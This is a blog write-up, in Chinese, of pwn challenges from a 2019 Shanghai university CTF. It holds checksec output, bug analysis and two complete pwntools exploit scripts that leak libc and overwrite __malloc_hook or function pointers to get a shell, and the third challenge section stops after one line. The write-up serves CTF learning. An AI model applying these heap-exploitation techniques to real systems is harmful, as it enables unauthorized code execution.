---
title: 2019上海大学生CTF记录
author: nepire
avatar: /images/title.ico
authorLink: https://nepire.github.io/
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-06 17:31:14
tags:
keywords:
description:
photos: /images/cover/5.png
---
# boring_heap
```
nepire@vm:~/CTF/boring_heap$ checksec pwn 
[*] '/home/nepire/CTF/boring_heap/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
```
nepire@vm:~/CTF/boring_heap$ strings libc.so | grep "GNU"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
	GNU Libidn by Simon Josefsson
```
菜单框架，new，edit，delete，show四个功能，最多能存在30个chunk，new的size限定于[0x20,0x30,0x40]

其中edit功能比较奇怪，可以选择在+n位置开始写size-n个字符

```
void edit()
{
  int op; // ST04_4
  int i; // [rsp+0h] [rbp-10h]
  puts("Which one do you want to update?");
  i = abs(readint()) % 30;
  if ( note[i] && (note_size[i] == 0x20 || note_size[i] == 0x30 || note_size[i] == 0x40) )
  {
    puts("Where you want to update?");
    op = abs(readint()) % note_size[i];
    puts("Input Content:");
    readn((note[i] + op), note_size[i] - op);
  }
  else
  {
    puts("Invalid Index!");
  }
}
```
abs可以把0x8000000以上的识别为负数

而求余以后0x20，0x40均为0，只有0x30为–32，通过这个改chunk的size位


```
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
#n = remote("8sdafgh.gamectf.com",10001)
elf=ELF('./pwn')
libc = elf.libc


def choice(idx):
	n.recvuntil('5.Exit')
	n.sendline(str(idx))


def new(size_i,content):
	choice(1)
	n.recvuntil("3.Large")
	n.sendline(str(size_i))
	n.recvuntil("Input Content:")
	n.send(content)


def edit(idx,size,content):
	choice(2)
	n.recvuntil("update?")
	n.sendline(str(idx))
	n.recvuntil("update?")
	n.sendline(str(size))
	n.recvuntil("Content:")
	n.send(content)


def free(idx):
	choice(3)
	n.recvuntil("delete?")
	n.sendline(str(idx))


def show(idx):
	choice(4)
	n.recvuntil("view?")
	n.sendline(str(idx))


new(2,'0'*0x30)
new(2,'1'*0x30)#0x40
new(3,'2'*0x40)#0x50
new(3,'3'*0x40)#0x50
new(2,'4'*0x30)#0x40
new(2,'5'*0x30)#0x30
new(2,'6'*0x30)
edit(5,0,(p64(0)+p64(0x21))*2)
edit(1,0x80000000,'a'*0x10+p64(0)+p64(0x91)+'\n')
#gdb.attach(n)
free(1)
new(2,'a'*7+'\n')
show(2)
libcbase = u64(n.recvuntil('\x7f')[-6:]+'\x00\x00')-0x3c4b78
print hex(libcbase)
#gdb.attach(n)
malloc_hook = libcbase + libc.sym['__malloc_hook']
one = libcbase + 0xf02a4 
#+0x20+5-8
new(1,'a'*0x20)
new(1,'a'*0x20)
new(1,'a'*0x20)
new(1,'a'*0x20)
edit(4,0x80000000,'a'*0x10+p64(0)+p64(0x51)+'\n')
free(4)
free(5)
edit(5,0x80000000,p64(malloc_hook)*2)
gdb.attach(n)


n.interactive()
```


# login
```
nepire@vm:~/CTF/login$ checksec login
[*] '/home/nepire/CTF/login/login'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

经典菜单稍微变了一下变成账户操作，有注册，登录，删除，修改功能，通过strcmp判断登录passwd，成功可输出passwd内容，并且没有限制判断次数

可登录0-9的用户，但最多可注册，删除，修改的用户为0-5

size范围为[0,0xff] 可以直接unsortbin来leaklibc

构造错位控制函数指针和指针内容leak libc ，然后修改为system，sh来getshell


```
from pwn import*
context(os='linux',arch='amd64')#,log_level='debug')
n = process('./login')
elf=ELF('./login')
libc =  elf.libc


def choice(idx):
	n.recvuntil('Choice')
	n.sendline(str(idx))


def login(idx,size,passwd):
	choice(1)
	n.recvuntil('id:')
	n.sendline(str(idx))
	n.recvuntil('length:')
	n.sendline(str(size))
	n.recvuntil('password:')
	n.send(passwd)


def new(idx,size,passwd):
	choice(2)
	n.recvuntil('id:')
	n.sendline(str(idx))
	n.recvuntil('length:')
	n.sendline(str(size))
	n.recvuntil('password:')
	n.send(passwd)


def free(idx):
	choice(3)
	n.recvuntil('id:')
	n.sendline(str(idx))


def edit(idx,passwd):
	choice(4)
	n.recvuntil('id:')
	n.sendline(str(idx))
	n.recvuntil('new pass:')
	n.send(passwd)


heapbase = 0x603000


new(0,0x18,'/bin/sh')
new(1,0xff,'1111')# unsortbin
new(2,0x18,'2222')
free(1)
free(2)
new(3,0x18,'3333')
libcbase = 0
for i in range(6):
	for j in range(0,0x100):
		edit(3,p64(heapbase+0x55-i))
		login(2,0x18,p64(libcbase*0x100+j))
		n.recvuntil('\n')
		meg = n.recvline()
		#n.success(meg)
		if meg=="Login success!\n":
			libcbase = (libcbase*0x100)+j
			n.success(hex(libcbase))
			break;


libcbase = libcbase - 0x3c4b78
n.success(hex(libcbase))
system = libcbase +libc.sym['system']


edit(3,p64(heapbase+0x10)+p64(system))
login(2,0x18,'/bin/sh')
n.interactive()
```

# slient_note
```
nepire@vm:~/CTF/slient_note$ checksec pwn 
[*] '/home/nepire/CTF/slient_note/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
只有new，edit，delete的菜单题
